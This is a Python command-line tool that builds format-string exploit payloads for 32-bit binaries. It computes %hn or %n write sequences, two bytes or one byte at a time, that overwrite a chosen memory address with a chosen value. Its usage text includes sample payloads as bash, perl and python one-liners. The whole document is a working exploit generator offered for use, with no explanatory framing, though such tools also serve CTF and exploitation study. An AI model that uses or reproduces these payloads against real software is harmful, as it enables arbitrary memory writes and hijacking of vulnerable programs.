#!/usr/bin/env python
# coding=utf-8


import sys
try:
    from pwn import *
except ImportError:
    from struct import pack as ppack
    from struct import unpack as uunpack


    def pack(value):
        return ppack("<I", value)


    def unpack(value):
        return uunpack("<I", value)[0]


def two_by_two(addr, value, offset, main=False):
    hob = value >> 16
    lob = value & 0xffff
    if hob < lob:
        first = hob - 8
        second = lob - hob
        offset_1 = offset
        offset_2 = offset + 1
    else:
        first = lob - 8
        second = hob - lob
        offset_1 = offset + 1
        offset_2 = offset
    addr_1 = pack(addr)
    addr_2 = pack(addr + 2)
    if main is True:
        fs = "{0}{1}%{2}x%{3}$hn%{4}x%{5}$hn".format(
            "".join('\\x{:02x}'.format(ord(c)) for c in addr_2),
            "".join('\\x{:02x}'.format(ord(c)) for c in addr_1),
            first, offset_1, second, offset_2)
    else:
        fs = "{0}{1}%{2}x%{3}$hn%{4}x%{5}$hn".format(
            bytes(addr_2), bytes(addr_1),
            first, offset_1, second, offset_2)
    return fs


def one_by_one(addr, value, offset, main=False):
    b = [value >> 24, (value >> 16) & 0xff, (value & 0xffff) >> 8, value & 0xff]
    first = b[3] - 16
    if b[2] < b[3]:
        second = 0x100 - (b[3] - b[2])
    else:
        second = b[2] - b[3]
    if b[1] < b[2]:
        third = 0x100 - (b[2] - b[1])
    else:
        third = b[1] - b[2]
    if b[0] < b[1]:
        fourth = 0x100 - (b[1] - b[0])
    else:
        fourth = b[0] - b[1]
    fs = ""
    for i, delta in enumerate([first, second, third, fourth]):
        if delta > 0:
            fs += "%{0}x%{1}$n".format(delta, offset+i)
        else:
            fs += "%{0}$n".format(offset+i)
    if main is True:
        fs = "{0}{1}{2}{3}".format(
            "".join('\\x{:02x}'.format(ord(c)) for c in pack(addr)),
            "".join('\\x{:02x}'.format(ord(c)) for c in pack(addr+1)),
            "".join('\\x{:02x}'.format(ord(c)) for c in pack(addr+2)),
            "".join('\\x{:02x}'.format(ord(c)) for c in pack(addr+3))
        ) + fs
    else:
        fs = "{0}{1}{2}{3}".format(
            bytes(pack(addr)),
            bytes(pack(addr+1)),
            bytes(pack(addr+2)),
            bytes(pack(addr+3))
        ) + fs
    return fs


if __name__ == '__main__':
    if len(sys.argv) < 5:
        print("""usage: ./" + {0} + " <address> <value> <number>
        address: The address to replace
        value: The value to get at that address
        number: The number of format needed
        technique: The technique used to rewrite
                    ('two' for two by bytes two bytes, 'one' for one by one)

    Ex.: ./{0} 08049778 bffff7c7 4
    Format string is:
        bash: $(printf "\\x7a\\x97\\x04\\x08\\x78\\x97\\x04\\x0%49143x%4\\$hn%14280x%5\\$hn")
        perl: $(perl -e 'print "\\x7a\\x97\\x04\\x08\\x78\\x97\\x04\\x08%49143x%4$hn%14280x%5$hn"')
        python: $(python -c 'print "\\x7a\\x97\\x04\\x08\\x78\\x97\\x04\\x08%49143x%4$hn%14280x%5$hn"')
    """.format(sys.argv[0]))

    address = int(sys.argv[1], 16)
    value = int(sys.argv[2], 16)
    number = int(sys.argv[3])
    technique = sys.argv[4]

    if technique == 'one':
        s = one_by_one(address, value, number, main=True)
    else:
        s = two_by_two(address, value, number, main=True)

    print("""
    Format string is:
        bash: $(printf "{0}")
        perl: $(perl -e  'print "{0}"')
        python: $(python -c 'print "{0}"')
    """.format(s))
